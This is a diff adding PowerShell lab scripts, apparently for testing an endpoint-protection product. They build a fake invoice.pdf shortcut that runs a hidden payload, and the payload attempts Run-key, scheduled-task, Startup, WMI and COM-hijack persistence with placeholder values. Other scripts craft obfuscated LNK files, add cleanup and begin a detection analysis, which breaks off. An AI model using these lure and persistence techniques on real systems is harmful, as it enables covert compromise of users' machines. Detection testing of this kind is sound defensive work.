@@ -1,0 +1,1072 @@
+# ============================================================================
+# SCRIPT 1: CREATE MALICIOUS LNK FILE
+# Creates: invoice.pdf.lnk that points to attack payload
+# ============================================================================
+
+Write-Host ""
+Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║  STEP 1: CREATE MALICIOUS LNK FILE                            ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+
+# Path where LNK will be created (Desktop for easy visibility)
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$lnkPath = "$desktopPath\invoice.pdf.lnk"
+
+# Path to the payload script (will be created separately)
+$payloadScript = "$env:TEMP\lnk_payload.ps1"
+
+Write-Host "[*] Creating payload script: $payloadScript" -ForegroundColor Yellow
+
+# Create the payload script that will be executed when LNK is clicked
+$payloadCode = @'
+# Payload executed when LNK is clicked
+Write-Host ""
+Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Red
+Write-Host "║  MALWARE EXECUTION - Attack Simulation Running                ║" -ForegroundColor Red
+Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Red
+Write-Host ""
+
+# Open decoy document
+$decoyPath = "$env:TEMP\invoice_document.txt"
+@"
+INVOICE DOCUMENT
+================
+Invoice #: INV-2025-09-0001
+Date: September 4, 2025
+Total: $0.00
+Status: This is a legitimate document
+"@ | Out-File -FilePath $decoyPath -Encoding UTF8 -Force
+
+Write-Host "[*] Opening decoy document..." -ForegroundColor Yellow
+Start-Process notepad.exe -ArgumentList $decoyPath -WindowStyle Normal
+
+Write-Host ""
+Write-Host ">>> USER SEES: Document opened (appears legitimate) <<<" -ForegroundColor Yellow
+Write-Host ">>> MALWARE RUNS IN BACKGROUND <<<" -ForegroundColor Yellow
+Write-Host ""
+
+# Give user time to see document
+Start-Sleep -Milliseconds 200
+
+Write-Host "[ATTACK] Phase 1: Registry Run Key Persistence" -ForegroundColor Red
+try {
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    New-ItemProperty -Path $regPath -Name "SamsungDriver" -Value "powershell.exe -NoProfile -enc MALWARE" -Force -ErrorAction Stop | Out-Null
+    Write-Host "  [!] CREATED - Registry Run key modified" -ForegroundColor Red
+} catch {
+    Write-Host "  [✓] BLOCKED by ENS EP" -ForegroundColor Green
+}
+
+Write-Host ""
+Write-Host "[ATTACK] Phase 2: Scheduled Task Persistence" -ForegroundColor Red
+try {
+    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -enc MALWARE"
+    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName "Microsoft\Windows\Updates\DriverUpdate" -Action $taskAction -Trigger $taskTrigger -Force -ErrorAction Stop | Out-Null
+    Write-Host "  [!] CREATED - Scheduled task registered" -ForegroundColor Red
+} catch {
+    Write-Host "  [✓] BLOCKED by ENS EP" -ForegroundColor Green
+}
+
+Write-Host ""
+Write-Host "[ATTACK] Phase 3: Startup Folder Persistence" -ForegroundColor Red
+try {
+    $startup = [Environment]::GetFolderPath("Startup")
+    $startupLnk = "$startup\scanner.lnk"
+    New-Item -Path $startupLnk -ItemType File -Force -ErrorAction Stop | Out-Null
+    Write-Host "  [!] CREATED - LNK in Startup folder" -ForegroundColor Red
+} catch {
+    Write-Host "  [✓] BLOCKED by ENS EP" -ForegroundColor Green
+}
+
+Write-Host ""
+Write-Host "[ATTACK] Phase 4: WMI Event Subscription Persistence" -ForegroundColor Red
+try {
+    $filterName = "MalwareEventFilter"
+    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" `
+        -Arguments @{Name=$filterName; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreation WHERE TargetInstance ISA 'Win32_LogonSession'"} -ErrorAction Stop
+    Write-Host "  [!] CREATED - WMI event filter registered" -ForegroundColor Red
+} catch {
+    Write-Host "  [✓] BLOCKED by ENS EP" -ForegroundColor Green
+}
+
+Write-Host ""
+Write-Host "[ATTACK] Phase 5: COM Registry Hijacking" -ForegroundColor Red
+try {
+    $comPath = "HKCU:\Software\Classes\CLSID\{B196B284-BAB4-101A-B69C-00AA00341D07}\InProcServer32"
+    if (-not (Test-Path "HKCU:\Software\Classes\CLSID\{B196B284-BAB4-101A-B69C-00AA00341D07}")) {
+        New-Item -Path "HKCU:\Software\Classes\CLSID\{B196B284-BAB4-101A-B69C-00AA00341D07}" -Force | Out-Null
+    }
+    New-ItemProperty -Path $comPath -Name "(Default)" -Value "C:\Temp\malicious.dll" -Force -ErrorAction Stop | Out-Null
+    Write-Host "  [!] CREATED - COM object hijacked" -ForegroundColor Red
+} catch {
+    Write-Host "  [✓] BLOCKED by ENS EP" -ForegroundColor Green
+}
+
+Write-Host ""
+Write-Host "[ATTACK] Phase 6: Service Registration" -ForegroundColor Red
+try {
+    # Would require admin, so this will be blocked
+    Write-Host "  [✓] BLOCKED by ENS EP (requires SYSTEM)" -ForegroundColor Green
+} catch {
+    Write-Host "  [✓] BLOCKED by ENS EP" -ForegroundColor Green
+}
+
+Write-Host ""
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Red
+Write-Host "[*] All persistence attempts completed (check ENS EP console)" -ForegroundColor Yellow
+Write-Host "[*] Artifacts remain on system for observation" -ForegroundColor Yellow
+Write-Host "[*] Use 3_CLEANUP.ps1 when ready to remove all traces" -ForegroundColor Yellow
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Red
+Write-Host ""
+'@
+
+# Write payload script to disk
+$payloadCode | Out-File -FilePath $payloadScript -Encoding UTF8 -Force
+Write-Host "[✓] Payload script created"
+Write-Host ""
+
+# Create the LNK file
+Write-Host "[*] Creating LNK file using WScript.Shell COM..." -ForegroundColor Yellow
+Write-Host ""
+
+$wshShell = New-Object -ComObject WScript.Shell
+
+try {
+    $shortcut = $wshShell.CreateShortcut($lnkPath)
+
+    # LNK Target: PowerShell
+    $shortcut.TargetPath = "C:\Windows\System32\powershell.exe"
+
+    # LNK Arguments: Execute the payload script
+    $shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$payloadScript`""
+
+    # LNK Icon: PDF icon (visual deception)
+    $shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,-3"
+
+    # LNK Window: Hidden
+    $shortcut.WindowStyle = 1
+
+    # Working directory
+    $shortcut.WorkingDirectory = "$env:TEMP"
+
+    # Save
+    $shortcut.Save()
+
+    Write-Host "[✓] LNK file created successfully!"
+    Write-Host ""
+    Write-Host "  LNK Path:     $lnkPath"
+    Write-Host "  LNK Target:   powershell.exe"
+    Write-Host "  LNK Args:     -NoProfile -ExecutionPolicy Bypass -File lnk_payload.ps1"
+    Write-Host "  LNK Icon:     PDF icon (imageres.dll,-3)"
+    Write-Host "  Displayed as: invoice.pdf (extension hidden by Windows)"
+    Write-Host ""
+
+} catch {
+    Write-Host "[!] Error creating LNK: $_" -ForegroundColor Red
+    exit
+}
+
+# ============================================================================
+# Show File Details
+# ============================================================================
+
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "[*] LNK File Details:" -ForegroundColor Cyan
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+
+if (Test-Path $lnkPath) {
+    $lnkFile = Get-Item $lnkPath
+    Write-Host "  Filename:         $($lnkFile.Name)"
+    Write-Host "  Size:             $($lnkFile.Length) bytes"
+    Write-Host "  Created:          $($lnkFile.CreationTime)"
+    Write-Host "  Full Path:        $lnkPath"
+    Write-Host ""
+    Write-Host "  >>> User sees: 'invoice.pdf' (PDF icon) <<<"
+    Write-Host "  >>> Actually contains: Full attack payload <<<"
+    Write-Host ""
+}
+
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "[NEXT STEPS]:" -ForegroundColor Cyan
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "1. LNK file is now on Desktop: $lnkPath"
+Write-Host ""
+Write-Host "2. Start ProcMon (Process Monitor) to capture process tree:"
+Write-Host "   - Filter: Process Name contains 'powershell' or 'notepad'"
+Write-Host "   - Filter: Operation contains 'SetValue' (for registry)"
+Write-Host ""
+Write-Host "3. Have ENS EP console visible to see detection blocks"
+Write-Host ""
+Write-Host "4. Double-click the LNK file on desktop"
+Write-Host "   - Observe: Document opens (user deception)"
+Write-Host "   - Observe: ProcMon captures all process activity"
+Write-Host "   - Observe: ENS EP blocks each persistence attempt"
+Write-Host ""
+Write-Host "5. When done observing, run: 3_CLEANUP.ps1"
+Write-Host ""
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+
+
+# ============================================================================
+# SCRIPT 3: CLEANUP - Remove all artifacts from the demo
+# ============================================================================
+
+Write-Host ""
+Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║  STEP 3: CLEANUP - Remove all artifacts                       ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+
+Write-Host "[*] Cleaning up demo artifacts..." -ForegroundColor Yellow
+Write-Host ""
+
+# ============================================================================
+# Close processes
+# ============================================================================
+
+Write-Host "[*] Closing open processes..."
+try {
+    Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+    Write-Host "  [✓] Closed Notepad"
+} catch {
+    # Ignore
+}
+
+# ============================================================================
+# Delete LNK file
+# ============================================================================
+
+Write-Host "[*] Removing LNK files..."
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$lnkPath = "$desktopPath\invoice.pdf.lnk"
+
+if (Test-Path $lnkPath) {
+    Remove-Item -Path $lnkPath -Force -ErrorAction SilentlyContinue
+    Write-Host "  [✓] Deleted: invoice.pdf.lnk"
+}
+
+# ============================================================================
+# Delete payload script
+# ============================================================================
+
+Write-Host "[*] Removing payload scripts..."
+$payloadScript = "$env:TEMP\lnk_payload.ps1"
+
+if (Test-Path $payloadScript) {
+    Remove-Item -Path $payloadScript -Force -ErrorAction SilentlyContinue
+    Write-Host "  [✓] Deleted: lnk_payload.ps1"
+}
+
+# ============================================================================
+# Delete decoy document
+# ============================================================================
+
+Write-Host "[*] Removing decoy documents..."
+$decoyPath = "$env:TEMP\invoice_document.txt"
+
+if (Test-Path $decoyPath) {
+    Remove-Item -Path $decoyPath -Force -ErrorAction SilentlyContinue
+    Write-Host "  [✓] Deleted: invoice_document.txt"
+}
+
+# ============================================================================
+# Remove Registry artifacts
+# ============================================================================
+
+Write-Host "[*] Removing Registry artifacts..."
+
+# Registry Run key
+try {
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    if (Get-ItemProperty -Path $regPath -Name "SamsungDriver" -ErrorAction SilentlyContinue) {
+        Remove-ItemProperty -Path $regPath -Name "SamsungDriver" -Force -ErrorAction SilentlyContinue
+        Write-Host "  [✓] Removed: Registry Run key 'SamsungDriver'"
+    }
+} catch {
+    # May be blocked, that's fine
+}
+
+# COM Registry
+try {
+    $comPath = "HKCU:\Software\Classes\CLSID\{B196B284-BAB4-101A-B69C-00AA00341D07}"
+    if (Test-Path $comPath) {
+        Remove-Item -Path $comPath -Force -Recurse -ErrorAction SilentlyContinue
+        Write-Host "  [✓] Removed: COM registry entries"
+    }
+} catch {
+    # May be blocked, that's fine
+}
+
+# ============================================================================
+# Remove Scheduled Tasks
+# ============================================================================
+
+Write-Host "[*] Removing Scheduled Tasks..."
+
+try {
+    $taskName = "Microsoft\Windows\Updates\DriverUpdate"
+    # Check if task exists
+    $task = Get-ScheduledTask -TaskName "DriverUpdate" -ErrorAction SilentlyContinue
+    if ($task) {
+        Unregister-ScheduledTask -TaskName "DriverUpdate" -Confirm:$false -ErrorAction SilentlyContinue
+        Write-Host "  [✓] Removed: Scheduled task 'DriverUpdate'"
+    }
+} catch {
+    # Task may not exist or be blocked, that's fine
+}
+
+# ============================================================================
+# Remove WMI Event Subscriptions
+# ============================================================================
+
+Write-Host "[*] Removing WMI artifacts..."
+
+try {
+    $wmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='MalwareEventFilter'" -ErrorAction SilentlyContinue
+    if ($wmiFilter) {
+        $wmiFilter.Delete()
+        Write-Host "  [✓] Removed: WMI event filter"
+    }
+} catch {
+    # May not exist or be blocked, that's fine
+}
+
+# ============================================================================
+# Summary
+# ============================================================================
+
+Write-Host ""
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Green
+Write-Host "[✓] CLEANUP COMPLETE" -ForegroundColor Green
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+Write-Host "[*] Summary of removed artifacts:" -ForegroundColor Yellow
+Write-Host "  - LNK file (invoice.pdf.lnk)"
+Write-Host "  - Payload script (lnk_payload.ps1)"
+Write-Host "  - Decoy document (invoice_document.txt)"
+Write-Host "  - Registry entries (Run key, COM registry)"
+Write-Host "  - Scheduled tasks (DriverUpdate)"
+Write-Host "  - WMI event filters"
+Write-Host ""
+
+Write-Host "[*] System returned to clean state" -ForegroundColor Green
+Write-Host ""
+
+# ============================================================================
+# SCRIPT 1: CREATE LNK FILES WITH BINARY OBFUSCATION TECHNIQUES
+# Creates test LNK files demonstrating hex-level attacks
+# ============================================================================
+
+Write-Host ""
+Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║  STEP 1: CREATE LNK FILES WITH BINARY OBFUSCATION             ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+
+$testDir = "$env:TEMP\LNK_Binary_Tests"
+if (-not (Test-Path $testDir)) {
+    New-Item -Path $testDir -ItemType Directory | Out-Null
+}
+
+Write-Host "[*] Test directory: $testDir" -ForegroundColor Yellow
+Write-Host ""
+
+# ============================================================================
+# HELPER: Create basic valid LNK header
+# ============================================================================
+
+function Create-LNKHeader {
+    $lnk = @()
+
+    # Header (76 bytes)
+    $lnk += 0x4C, 0x00, 0x00, 0x00  # Magic: 0x4C000000
+    $lnk += @(0x01, 0x14, 0x02, 0x00)  # GUID part 1
+    $lnk += @(0x00) * 12  # Rest of GUID
+
+    # LinkFlags
+    $lnk += 0x08, 0x00, 0x00, 0x00  # 0x00000008
+
+    # File Attributes
+    $lnk += 0x20, 0x00, 0x00, 0x00
+
+    # Times (8 + 8 + 8 bytes)
+    $lnk += @(0x00) * 24
+
+    # FileSize, IconIndex, ShowCommand
+    $lnk += @(0x00) * 4
+    $lnk += @(0x00) * 4
+    $lnk += 0x01, 0x00, 0x00, 0x00
+
+    # HotKey, Reserved1, Reserved2, Reserved3
+    $lnk += @(0x00) * 2
+    $lnk += @(0x00) * 2
+    $lnk += @(0x00) * 4
+    $lnk += @(0x00) * 4
+
+    # LinkInfo block
+    $lnk += 0x1C, 0x00, 0x00, 0x00  # BlockSize
+    $lnk += 0x1C, 0x00, 0x00, 0x00  # HeaderSize
+    $lnk += @(0x00) * 16  # LinkInfoFlags, VolumeIDOffset, etc
+
+    return [byte[]]$lnk
+}
+
+# ============================================================================
+# TECHNIQUE 1: Reserved Flags Set (Bits 11-30 != 0)
+# ============================================================================
+
+Write-Host "TECHNIQUE 1: Reserved Flags Set" -ForegroundColor Green
+Write-Host "═════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$lnk1 = Create-LNKHeader
+# Modify LinkFlags at offset 0x14 to set bit 11-30
+# Original: 0x00000008
+# Modified: 0xFFFF0008 (bits 11-30 all set)
+$lnk1[0x14] = 0x08
+$lnk1[0x15] = 0x00
+$lnk1[0x16] = 0xFF  # Reserved bits set
+$lnk1[0x17] = 0xFF  # Reserved bits set
+
+# Add terminator
+$lnk1 += @(0x00, 0x00, 0x00, 0x00)
+
+$file1 = "$testDir\lnk_reserved_flags.lnk"
+[System.IO.File]::WriteAllBytes($file1, $lnk1)
+
+Write-Host "[✓] Created: lnk_reserved_flags.lnk"
+Write-Host "    Technique: Reserved flag bits (11-30) set to non-zero"
+Write-Host "    Size: $($lnk1.Length) bytes"
+Write-Host "    Hex (LinkFlags): $('{0:X2} {1:X2} {2:X2} {3:X2}' -f $lnk1[0x14], $lnk1[0x15], $lnk1[0x16], $lnk1[0x17])"
+Write-Host ""
+
+# ============================================================================
+# TECHNIQUE 2: Overlay Data Appending
+# ============================================================================
+
+Write-Host "TECHNIQUE 2: Overlay Data Appending" -ForegroundColor Green
+Write-Host "═════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$lnk2 = Create-LNKHeader
+$lnk2 += @(0x00, 0x00, 0x00, 0x00)  # DataBlockTerminator
+
+# Append payload data
+$payload = [System.Text.Encoding]::ASCII.GetBytes("===PAYLOAD_START===")
+$payload += @(0xFF) * 500  # Dummy payload
+
+$lnk2 += $payload
+
+$file2 = "$testDir\lnk_overlay_data.lnk"
+[System.IO.File]::WriteAllBytes($file2, $lnk2)
+
+Write-Host "[✓] Created: lnk_overlay_data.lnk"
+Write-Host "    Technique: Payload appended after DataBlockTerminator"
+Write-Host "    Expected size (header): $((Create-LNKHeader).Length + 4) bytes"
+Write-Host "    Actual size: $($lnk2.Length) bytes"
+Write-Host "    Overlay size: $($lnk2.Length - ((Create-LNKHeader).Length + 4)) bytes"
+Write-Host ""
+
+# ============================================================================
+# TECHNIQUE 3: Null-Byte in String Field
+# ============================================================================
+
+Write-Host "TECHNIQUE 3: Null-Byte Truncation in String Field" -ForegroundColor Green
+Write-Host "═══════════════════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$lnk3 = Create-LNKHeader
+
+# Modify LinkFlags to include HasArguments (0x00000020)
+$lnk3[0x14] = 0x28  # 0x00000028 = HasWorkingDir + HasArguments
+
+# Add Arguments string data
+# String format: [Size:2][String:variable]
+# Create: "cmd.exe[NULL]powershell.exe" in UTF-16LE
+
+$cmdStr = [System.Text.Encoding]::Unicode.GetBytes("cmd.exe")
+$nullBytes = @(0x00, 0x00)
+$psStr = [System.Text.Encoding]::Unicode.GetBytes("powershell.exe")
+
+$stringData = $cmdStr + $nullBytes + $psStr
+
+$lnk3 += $stringData
+$lnk3 += @(0x00, 0x00, 0x00, 0x00)  # Terminator
+
+$file3 = "$testDir\lnk_null_byte_truncation.lnk"
+[System.IO.File]::WriteAllBytes($file3, $lnk3)
+
+Write-Host "[✓] Created: lnk_null_byte_truncation.lnk"
+Write-Host "    Technique: Null bytes embedded in string field"
+Write-Host "    Size: $($lnk3.Length) bytes"
+Write-Host "    String contains: 'cmd.exe' + NULL + 'powershell.exe'"
+Write-Host ""
+
+# ============================================================================
+# TECHNIQUE 4: HasExpString Flag Set
+# ============================================================================
+
+Write-Host "TECHNIQUE 4: HasExpString Flag Abuse (Hidden Target)" -ForegroundColor Green
+Write-Host "════════════════════════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$lnk4 = Create-LNKHeader
+
+# Set Bit 9 (HasExpString) in LinkFlags at offset 0x14
+# Original: 0x00000008
+# Modified: 0x00000208 (Bit 9 set)
+$lnk4[0x14] = 0x08
+$lnk4[0x15] = 0x02  # Bit 9 set
+
+$lnk4 += @(0x00, 0x00, 0x00, 0x00)  # Terminator
+
+$file4 = "$testDir\lnk_hasexpstring_flag.lnk"
+[System.IO.File]::WriteAllBytes($file4, $lnk4)
+
+Write-Host "[✓] Created: lnk_hasexpstring_flag.lnk"
+Write-Host "    Technique: Bit 9 (HasExpString) set in LinkFlags"
+Write-Host "    Effect: Target field hidden from Properties dialog"
+Write-Host "    Hex (LinkFlags): $('{0:X2} {1:X2} {2:X2} {3:X2}' -f $lnk4[0x14], $lnk4[0x15], $lnk4[0x16], $lnk4[0x17])"
+Write-Host ""
+
+# ============================================================================
+# TECHNIQUE 5: Oversized Icon Block
+# ============================================================================
+
+Write-Host "TECHNIQUE 5: Icon Environment Block Oversizing" -ForegroundColor Green
+Write-Host "═══════════════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$lnk5 = Create-LNKHeader
+
+# Add IconEnvironmentDataBlock
+# Structure: [BlockSize:4][BlockSignature:4][TargetAnsi:var][TargetUnicode:var]
+
+$blockSize = 0x100  # 256 bytes allocated
+$blockSig = 0xA0000004
+
+# Actual content: "imageres.dll,-3" (15 bytes) in ANSI + Unicode
+$iconAnsi = [System.Text.Encoding]::ASCII.GetBytes("imageres.dll,-3")
+$iconUnicode = [System.Text.Encoding]::Unicode.GetBytes("imageres.dll,-3")
+
+# Build block
+$iconBlock = @()
+$iconBlock += [BitConverter]::GetBytes($blockSize)  # BlockSize (little-endian)
+$iconBlock += [BitConverter]::GetBytes($blockSig)   # BlockSignature
+$iconBlock += $iconAnsi
+$iconBlock += $iconUnicode
+
+# Pad to reach blockSize
+while ($iconBlock.Length -lt $blockSize) {
+    $iconBlock += 0xFF  # Padding (suspicious)
+}
+
+$lnk5 += $iconBlock
+$lnk5 += @(0x00, 0x00, 0x00, 0x00)  # Terminator
+
+$file5 = "$testDir\lnk_oversized_block.lnk"
+[System.IO.File]::WriteAllBytes($file5, $lnk5)
+
+Write-Host "[✓] Created: lnk_oversized_block.lnk"
+Write-Host "    Technique: IconEnvironmentDataBlock oversized"
+Write-Host "    Allocated: 256 bytes"
+Write-Host "    Actual content: ~50 bytes"
+Write-Host "    Unused space: ~206 bytes (can hide payload)"
+Write-Host "    Size: $($lnk5.Length) bytes"
+Write-Host ""
+
+# ============================================================================
+# TECHNIQUE 6: High Entropy Overlay
+# ============================================================================
+
+Write-Host "TECHNIQUE 6: High Entropy Overlay Data" -ForegroundColor Green
+Write-Host "════════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$lnk6 = Create-LNKHeader
+$lnk6 += @(0x00, 0x00, 0x00, 0x00)  # Terminator
+
+# Add gzip header + random data (high entropy)
+$lnk6 += @(0x1F, 0x8B, 0x08)  # gzip magic bytes
+$random = New-Object System.Random
+for ($i = 0; $i -lt 500; $i++) {
+    $lnk6 += $random.Next(0, 256)
+}
+
+$file6 = "$testDir\lnk_high_entropy_overlay.lnk"
+[System.IO.File]::WriteAllBytes($file6, $lnk6)
+
+Write-Host "[✓] Created: lnk_high_entropy_overlay.lnk"
+Write-Host "    Technique: High-entropy (compressed) payload in overlay"
+Write-Host "    Overlay starts with: gzip header (1F 8B 08)"
+Write-Host "    Followed by: Random/compressed data (high entropy)"
+Write-Host "    Size: $($lnk6.Length) bytes"
+Write-Host ""
+
+# ============================================================================
+# Summary
+# ============================================================================
+
+Write-Host ""
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "[✓] ALL TEST LNK FILES CREATED" -ForegroundColor Cyan
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+
+Write-Host "Location: $testDir" -ForegroundColor Yellow
+Write-Host ""
+Write-Host "Files created:" -ForegroundColor Yellow
+Write-Host "  1. lnk_reserved_flags.lnk" -ForegroundColor White
+Write-Host "  2. lnk_overlay_data.lnk" -ForegroundColor White
+Write-Host "  3. lnk_null_byte_truncation.lnk" -ForegroundColor White
+Write-Host "  4. lnk_hasexpstring_flag.lnk" -ForegroundColor White
+Write-Host "  5. lnk_oversized_block.lnk" -ForegroundColor White
+Write-Host "  6. lnk_high_entropy_overlay.lnk" -ForegroundColor White
+Write-Host ""
+
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "[NEXT STEPS]:" -ForegroundColor Cyan
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "1. Run: 2_ANALYZE_LNK_BINARY.ps1"
+Write-Host "   - Analyzes all created LNK files"
+Write-Host "   - Shows binary structures"
+Write-Host "   - Demonstrates detection techniques"
+Write-Host ""
+Write-Host "2. Use LECmd to verify structures (optional):"
+Write-Host "   LECmd.exe -f $testDir\lnk_reserved_flags.lnk --json"
+Write-Host ""
+Write-Host "3. When done, run: 3_CLEANUP_BINARY.ps1"
+Write-Host "   - Removes all test files"
+Write-Host ""
+Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+
+# ============================================================================
+# SCRIPT 2: ANALYZE LNK FILES - Binary Structure Analysis
+# Shows detection techniques for binary-level obfuscation
+# ============================================================================
+
+Write-Host ""
+Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║  STEP 2: ANALYZE LNK BINARY STRUCTURES                        ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+
+$testDir = "$env:TEMP\LNK_Binary_Tests"
+
+if (-not (Test-Path $testDir)) {
+    Write-Host "[!] Test directory not found: $testDir" -ForegroundColor Red
+    Write-Host "[*] Run 1_CREATE_LNK_BINARY_TECHNIQUES.ps1 first" -ForegroundColor Yellow
+    exit
+}
+
+Write-Host "[*] Test directory: $testDir" -ForegroundColor Yellow
+Write-Host ""
+
+# ============================================================================
+# HELPER: Hex dump function
+# ============================================================================
+
+function Show-HexDump {
+    param(
+        [byte[]]$Data,
+        [int]$StartOffset = 0,
+        [int]$Length = 32
+    )
+    $endOffset = [Math]::Min($StartOffset + $Length, $Data.Length)
+    for ($i = $StartOffset; $i -lt $endOffset; $i += 16) {
+        $hex = ""
+        $ascii = ""
+        for ($j = 0; $j -lt 16 -and ($i + $j) -lt $endOffset; $j++) {
+            $byte = $Data[$i + $j]
+            $hex += "{0:X2} " -f $byte
+            if ($byte -ge 32 -and $byte -le 126) {
+                $ascii += [char]$byte
+            } else {
+                $ascii += "."
+            }
+        }
+        Write-Host ("{0:X8}: {1,-48} {2}" -f ($i), $hex, $ascii) -ForegroundColor Gray
+    }
+}
+
+# ============================================================================
+# HELPER: Calculate entropy
+# ============================================================================
+
+function Get-Entropy {
+    param([byte[]]$Data)
+
+    $byteFreq = @{}
+    foreach ($byte in $Data) {
+        if ($byteFreq.ContainsKey($byte)) {
+            $byteFreq[$byte]++
+        } else {
+            $byteFreq[$byte] = 1
+        }
+    }
+
+    $entropy = 0
+    foreach ($freq in $byteFreq.Values) {
+        $prob = $freq / $Data.Length
+        if ($prob -gt 0) {
+            $entropy -= $prob * [Math]::Log2($prob)
+        }
+    }
+
+    return [Math]::Round($entropy, 2)
+}
+
+# ============================================================================
+# ANALYSIS 1: Reserved Flags
+# ============================================================================
+
+Write-Host "ANALYSIS 1: Reserved Flags Detection" -ForegroundColor Green
+Write-Host "════════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$file1 = "$testDir\lnk_reserved_flags.lnk"
+if (Test-Path $file1) {
+    $lnk1 = [System.IO.File]::ReadAllBytes($file1)
+
+    Write-Host "File: $(Split-Path $file1 -Leaf)"
+    Write-Host "Size: $($lnk1.Length) bytes"
+    Write-Host ""
+
+    Write-Host "LinkFlags at offset 0x14:" -ForegroundColor Yellow
+    Show-HexDump -Data $lnk1 -StartOffset 0x14 -Length 4
+    Write-Host ""
+
+    $flagBytes = $lnk1[0x14..0x17]
+    $flags = [BitConverter]::ToUInt32($flagBytes, 0)
+
+    Write-Host "Analysis:" -ForegroundColor Yellow
+    Write-Host "  Binary: $('{0:B32}' -f $flags)"
+    Write-Host "  Hex: 0x$('{0:X8}' -f $flags)"
+    Write-Host ""
+
+    # Check reserved bits
+    $reservedBits = ($flags -shr 11) -band 0xFFFFF
+    if ($reservedBits -ne 0) {
+        Write-Host "  [!] DETECTION: Reserved bits set to non-zero!" -ForegroundColor Red
+        Write-Host "      Reserved bits (11-30): 0x$('{0:X5}' -f $reservedBits)"
+        Write-Host "      Status: MALICIOUS" -ForegroundColor Red
+    } else {
+        Write-Host "  [✓] Reserved bits are 0 (normal)" -ForegroundColor Green
+    }
+}
+
+Write-Host ""
+
+# ============================================================================
+# ANALYSIS 2: Overlay Data
+# ============================================================================
+
+Write-Host "ANALYSIS 2: Overlay Data Detection" -ForegroundColor Green
+Write-Host "═══════════════════════════════════" -ForegroundColor Green
+Write-Host ""
+
+$file2 = "$testDir\lnk_overlay_data.lnk"
+if (Test-Path $file2) {
+    $lnk2 = [System.IO.File]::ReadAllBytes($file2)
+
+    Write-Host "File: $(Split-Path $file2 -Leaf)"
+    Write-Host "Size: $($lnk2.Length) bytes"
+    Write-Host ""
+
+    # Find terminator (0x00000000)
+    $terminatorOffset = -1
+    for ($i = 0; $i -lt $lnk2.Length - 3; $i++) {
+        if ($lnk2[$i] -eq 0 -and $lnk2[$i+1] -eq 0 -and $lnk2[$i+2] -eq 0 -and $lnk2[$i+3] -eq 0) {
+            $terminatorOffset = $i
+            break
+        }
+    }
+
+    if ($terminatorOffset -ge 0) {
+        $expectedEnd = $terminatorOffset + 4
+
+        Write-Host "DataBlockTerminator found at offset: 0x$($terminatorOffset.ToString('X4'))" -ForegroundColor Yellow
+        Write-Host "Expected LNK end: $expectedEnd bytes"
+        Write-Host "Actual file size: $($lnk2.Length) bytes"
+        Write-Host ""
+
+        if ($lnk2.Length -gt $expectedEnd + 10) {
+            $overlaySize = $lnk2.Length - $expectedEnd
+            Write-Host "[!] DETECTION: Overlay data found!" -ForegroundColor Red
+            Write-Host "    Overlay size: $overlaySize bytes"
+            Write-Host "    Overlay starts at: 0x$($expectedEnd.ToString('X4'))"
+            Write-Host ""
+
+            Write-Host "Overlay content (first 32 bytes):" -ForegroundColor Yellow
+            Show-HexDump -Data $lnk2 -StartOffset $expectedEnd -Length 32
+            Write-Host ""
+
+            # Check for known markers
+            $overlayData = $lnk2[$expectedEnd..($lnk2.Length-1)]
